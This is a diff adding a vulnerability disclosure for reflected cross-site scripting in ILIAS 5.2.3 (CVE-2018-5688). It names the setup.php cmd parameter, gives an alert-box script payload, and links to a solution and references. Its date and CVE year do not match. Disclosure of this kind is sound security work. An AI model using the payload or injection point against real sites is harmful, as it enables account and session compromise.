@@ -1,0 +1,27 @@
+# Exploit Title: Cross Site Scripting in ILIAS CMS 5.2.3
+# Date: Apr 24, 2017
+# Software Link: https://www.ilias.de
+# Exploit Author: Florian Kunushevci
+# Contact: https://facebook.com/florianx00
+# CVE: CVE-2018-5688
+# Category: webapps
+
+1. Description
+
+ILIAS before 5.2.4 has XSS via the cmd parameter to the displayHeader
+function in setup/classes/class.ilSetupGUI.php in the Setup component.
+
+2. Proof of Concept
+
+Location : /setup/setup.php
+Parameter : ?cmd=
+Payload : "><script>alert(1)</script>
+
+3. Solution:
+
+https://www.ilias.de/docu/goto.php?target=lm_1719&client_id=docu
+
+4. References:
+
+https://nvd.nist.gov/vuln/detail/CVE-2018-5688
+https://www.ilias.de/docu/goto_docu_pg_75029_35.html
